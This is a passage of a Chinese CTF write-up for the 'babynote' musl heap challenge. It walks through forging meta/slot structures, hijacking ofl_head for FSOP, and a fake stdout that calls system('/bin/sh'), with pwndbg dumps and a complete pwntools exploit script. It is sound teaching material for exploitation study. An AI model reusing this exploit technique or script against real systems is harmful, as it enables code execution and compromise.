class="number">0x0000000000002030</span></span><br><span class="line"><span class="number">0x7f22b639fe10</span>:	<span class="number">0x00007f22b639fd60</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe20</span>:	<span class="number">0x0000555556925090</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到我们可以通过 b’b’(0x00007f22b63a3dd0 的数据是‘b’) 找到我们的 fake_babynote, 然后释放掉 0x00007f22b6395070 这个伪 slot</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">18</span>gx <span class="number">0x00007f22b6395070</span><span class="number">-0x60</span></span><br><span class="line"><span class="number">0x7f22b6395010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b6395020</span>:	<span class="number">0x00007f22b63a7e20</span>	<span class="number">0x00007f22b63a2e20</span></span><br><span class="line"><span class="number">0x7f22b6395030</span>:	<span class="number">0x00007f22b6395060</span>	<span class="number">0x00000000000003fe</span></span><br><span class="line"><span class="number">0x7f22b6395040</span>:	<span class="number">0x00000000000000a9</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b6395050</span>:	<span class="number">0x00007f22b6396020</span>	<span class="number">0x0000c00000000000</span></span><br><span class="line"><span class="number">0x7f22b6395060</span>:	<span class="number">0x00007f22b6395020</span>	<span class="number">0x0000800000000009</span>			<span class="comment">//伪造的slot堆头</span></span><br><span class="line"><span class="number">0x7f22b6395070</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x0000000000000000</span>			</span><br><span class="line"><span class="number">0x7f22b6395080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b6395090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>0x7f22b6395060 这个地址就是伪造的 group 的 base 地址，对应的数据就是伪造的 meta 地址</p>
+<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200825484.png" alt="image-20220422200825484"></p>
+<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200924302.png" alt="image-20220422200924302"></p>
+<p>0x00007f22b63a7e20 这里就是我们的目标地址 - 8，0x00007f22b63a2e20 这个地址是我们下一个申请出来的 slot 的真实地址（申请 0x50）mem==base,</p>
+<p>下面是伪造的 fake_meta1 以及对应的 fake_meta_area1</p>
+<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201357563.png" alt="image-20220422201357563"></p>
+<p>最后是 free_group 时的伪造的 fake_meta2 和 fake_meta_area</p>
+<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201627965.png" alt="image-20220422201627965"></p>
+<h4 id="fsop"><a class="markdownIt-Anchor" href="#fsop">#</a> FSOP</h4>
+<p>我们任意地址写的，是 ofl_head，类似于 glibc 的 ——IO__lisl_all, 只不过则合理一般情况下是空的，利用在于 exit 函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE **__ofl_lock()</span><br><span class="line">&#123;</span><br><span class="line">	LOCK(ofl_lock);</span><br><span class="line">	<span class="keyword">return</span> &amp;ofl_head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们把 ofl_head 改成我们可以控制的 slot 的地址，就在那里伪造一个 stdout，if (f-&gt;wpos != f-&gt;wbase) f-&gt;write (f, 0, 0); 并满足这里的条件（wpos!=wbase）write 改策划给你 system, 而且会把 fd 作为参数，fd 就是就会指向 flags, 把他写位‘/bin/sh\x00’</p>
+<p>正常的 stdout</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *<span class="built_in">stdout</span></span><br><span class="line">$<span class="number">21</span> = &#123;</span><br><span class="line">  flags = <span class="number">69</span>, </span><br><span class="line">  rpos = <span class="number">0x0</span>, </span><br><span class="line">  rend = <span class="number">0x0</span>, </span><br><span class="line">  close = <span class="number">0x7f22b61557e5</span> &lt;__stdio_close&gt;, </span><br><span class="line">  wend = <span class="number">0x0</span>, </span><br><span class="line">  wpos = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_1 = <span class="number">0x0</span>, </span><br><span class="line">  wbase = <span class="number">0x0</span>, </span><br><span class="line">  read = <span class="number">0x0</span>, </span><br><span class="line">  write = <span class="number">0x7f22b615598e</span> &lt;__stdio_write&gt;, </span><br><span class="line">  seek = <span class="number">0x7f22b615597d</span> &lt;__stdio_seek&gt;, </span><br><span class="line">  buf = <span class="number">0x7f22b63a6708</span> &lt;buf+<span class="number">8</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">  buf_size = <span class="number">0</span>, </span><br><span class="line">  prev = <span class="number">0x0</span>, </span><br><span class="line">  next = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">1</span>, </span><br><span class="line">  pipe_pid = <span class="number">0</span>, </span><br><span class="line">  lockcount = <span class="number">0</span>, </span><br><span class="line">  mode = <span class="number">-1</span>, </span><br><span class="line">  lock = <span class="number">-1</span>, </span><br><span class="line">  lbf = <span class="number">-1</span>, </span><br><span class="line">  cookie = <span class="number">0x0</span>, </span><br><span class="line">  off = <span class="number">0</span>, </span><br><span class="line">  getln_buf = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_2 = <span class="number">0x0</span>, </span><br><span class="line">  shend = <span class="number">0x0</span>, </span><br><span class="line">  shlim = <span class="number">0</span>, </span><br><span class="line">  shcnt = <span class="number">0</span>, </span><br><span class="line">  prev_locked = <span class="number">0x0</span>, </span><br><span class="line">  next_locked = <span class="number">0x0</span>, </span><br><span class="line">  locale = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>下面是伪造的 stdout</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p * (FILE * <span class="type">const</span>)<span class="number">0x7fc49ff72e20</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  flags = <span class="number">1852400175</span>, </span><br><span class="line">  rpos = <span class="number">0x0</span>, </span><br><span class="line">  rend = <span class="number">0x0</span>, </span><br><span class="line">  close = <span class="number">0x0</span>, </span><br><span class="line">  wend = <span class="number">0x0</span>, </span><br><span class="line">  wpos = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_1 = <span class="number">0x0</span>, </span><br><span class="line">  wbase = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;, </span><br><span class="line">  read = <span class="number">0x1</span>, </span><br><span class="line">  write = <span class="number">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class="line">  seek = <span class="number">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class="line">  buf = <span class="number">0x0</span>, </span><br><span class="line">  buf_size = <span class="number">0</span>, </span><br><span class="line">  prev = <span class="number">0x0</span>, </span><br><span class="line">  next = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">0</span>, </span><br><span class="line">  pipe_pid = <span class="number">0</span>, </span><br><span class="line">  lockcount = <span class="number">0</span>, </span><br><span class="line">  mode = <span class="number">0</span>, </span><br><span class="line">  lock = <span class="number">0</span>, </span><br><span class="line">  lbf = <span class="number">0</span>, </span><br><span class="line">  cookie = <span class="number">0x0</span>, </span><br><span class="line">  off = <span class="number">0</span>, </span><br><span class="line">  getln_buf = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_2 = <span class="number">0x0</span>, </span><br><span class="line">  shend = <span class="number">0x0</span>, </span><br><span class="line">  shlim = <span class="number">0</span>, </span><br><span class="line">  shcnt = <span class="number">0</span>, </span><br><span class="line">  prev_locked = <span class="number">0x0</span>, </span><br><span class="line">  next_locked = <span class="number">0x0</span>, </span><br><span class="line">  locale = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后 exit 结束程序</p>
+<h2 id="完整exp"><a class="markdownIt-Anchor" href="#完整exp">#</a> 完整 exp</h2>
+<p>部分注释可能错误</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">r=process([<span class="string">&quot;./libc.so&quot;</span>,<span class="string">&#x27;./babynote&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babynote&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get8</span>():</span><br><span class="line">	ret = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">		ret = r.recv(<span class="number">2</span>)+ret</span><br><span class="line">	ret = <span class="string">b&#x27;0x&#x27;</span>+ret</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(ret,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get4</span>():</span><br><span class="line">	ret = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">		ret = r.recv(<span class="number">2</span>)+ret</span><br><span class="line">	ret = <span class="string">b&#x27;0x&#x27;</span>+ret</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(ret,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;option:&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,text</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;name size:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;content&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">name</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;name size:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">name</span>):</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;name size:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():			<span class="comment">#only set list=0 </span></span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b malloc&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#slot full size is 0x2c</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span>)<span class="comment">#slot full size is 0x6c</span></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)				<span class="comment">#free the first note,the meta(0xc)is freed,</span></span><br><span class="line">clean()					<span class="comment">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)		<span class="comment">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class="line">						<span class="comment">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class="line">						<span class="comment">#then reuse the free slot in meta(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)			<span class="comment">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)			<span class="comment">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class="line">add(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#</span></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#fill up meta2(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;f&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x50</span>)		<span class="comment">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class="line"></span><br><span class="line">find(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">ss = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	ss = r.recv(<span class="number">2</span>)+ss</span><br><span class="line">ss  = <span class="string">b&#x27;0x&#x27;</span>+ss</span><br><span class="line"><span class="built_in">print</span>(ss)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(ss,<span class="number">16</span>) </span><br><span class="line">libcbase = heap_addr-  <span class="number">0x29fdf0</span></span><br><span class="line">stdout = libcbase + <span class="number">0x2a0e00</span></span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">__malloc_context = <span class="number">0x2a1aa0</span>+libcbase</span><br><span class="line">ofl_head = libcbase+ <span class="number">0x2a3e28</span> </span><br><span class="line">fake_stdout_addr = libcbase+<span class="number">0x29ee20</span>			<span class="comment">#we can malloc0x50 to get </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout : &quot;</span>,<span class="built_in">hex</span>(stdout))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#here we can leak anywhere</span></span><br><span class="line">pad = p64(libcbase+<span class="number">0x29fdb0</span>)+p64(__malloc_context)+p64(<span class="number">1</span>)+p64(<span class="number">0x420</span>)+p64(<span class="number">0</span>)</span><br><span class="line">find(pad)</span><br><span class="line">find(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#leak __malloc_context to  get meta addr</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;0x420:&quot;</span>)</span><br><span class="line">secret =get8()</span><br><span class="line">r.recv(<span class="number">16</span>)</span><br><span class="line">free_meta = get8()</span><br><span class="line">avail_meta = get8()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	get8()</span><br><span class="line">active=<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">	active.append(get8())</span><br><span class="line">meta_base  = active[<span class="number">0</span>]-<span class="number">0x28</span></span><br><span class="line">add(<span class="string">b&#x27;Z&#x27;</span>*<span class="number">0x100</span>,<span class="string">b&#x27;Z&#x27;</span>*<span class="number">0x100</span>)				<span class="comment">#fill up  the old meta to create new meta3(0x2c)</span></span><br><span class="line"></span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">fakemeta_addr = <span class="number">0x291020</span>+libcbase</span><br><span class="line">fake_meta =<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">4064</span>)+p64(secret)+p64(<span class="number">0</span>)*<span class="number">3</span> 												</span><br><span class="line">fake_meta += p64(ofl_head-<span class="number">0x8</span>)+p64(fake_stdout_addr)										<span class="comment">#fakemta1</span></span><br><span class="line">fake_meta +=p64(fakemeta_addr+<span class="number">0x40</span>)+p64(<span class="number">0x3fe</span>)+p64(<span class="number">0xa9</span>)+p64(<span class="number">0</span>)						</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_meta +=p64(fakemeta_addr+<span class="number">0x1000</span>)+p64(<span class="number">0x0000c00000000000</span>)</span><br><span class="line">fake_meta +=p64(fakemeta_addr)+p64(<span class="number">0x0000800000000009</span>)</span><br><span class="line">fake_meta +=<span class="string">b&quot;AAAAAAAA&quot;</span></span><br><span class="line">fake_meta = fake_meta.ljust((<span class="number">0x2000</span>-<span class="number">0x20</span>),<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_meta +=p64(secret)+p64(<span class="number">0</span>)*<span class="number">3</span>   														<span class="comment">#fake_area1</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(fakemeta_addr+<span class="number">0x30</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x3c0</span>)+p64(<span class="number">0</span>)			<span class="comment">#fakemeta2	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#prepare fake chunk and fake sotor</span></span><br><span class="line">add(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fakebabynote = p64( <span class="number">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class="line">free(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">add(p64(<span class="number">0x29bd00</span>+libcbase)*<span class="number">2</span>+p64(<span class="number">0x8</span>)+p64(<span class="number">0x8</span>)+p64(libcbase+<span class="number">0x29bd90</span>),fake_meta.ljust(<span class="number">0x2000</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">free(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">fake_stdfile  =<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">1</span>)*<span class="number">2</span>+p64(system)*<span class="number">2</span></span><br><span class="line">fake_stdfile = fake_stdfile.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;i&#x27;</span>,fake_stdfile)</span><br><span class="line">pause()</span><br><span class="line">ch(<span class="number">5</span>)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接">#</a> 参考链接</h2>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQxMTAx">https://www.anquanke.com/post/id/241101</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2thbGlfTWEvYXJ0aWNsZS9kZXRhaWxzLzEyMjk3MDg4NT9vcHNfcmVxdWVzdF9taXNjPSUyNTdCJTI1MjJyZXF1ZXN0JTI1NUZpZCUyNTIyJTI1M0ElMjUyMjE2NTA0NDQwOTMxNjc4MDI2NTQ3NDgzNiUyNTIyJTI1MkMlMjUyMnNjbSUyNTIyJTI1M0ElMjUyMjIwMTQwNzEzLjEzMDEwMjMzNC5wYyUyNTVGYWxsLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY1MDQ0NDA5MzE2NzgwMjY1NDc0ODM2JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMg==">https://blog.csdn.net/kali_Ma/article/details/122970885?ops_request_misc=%7B%22request%5Fid%22%3A%22165044409316780265474836%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=165044409316780265474836&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</span><sub>all</sub>first_rank_ecpm_v1~rank_v31_ecpm-1-122970885.142<sup>v9</sup>control,157<sup>v4</sup>control&amp;utm_term=musl+%E5%A0%86%E5%88%A9%E7%94%A8&amp;spm=1018.2226.3001.4187</p>
+
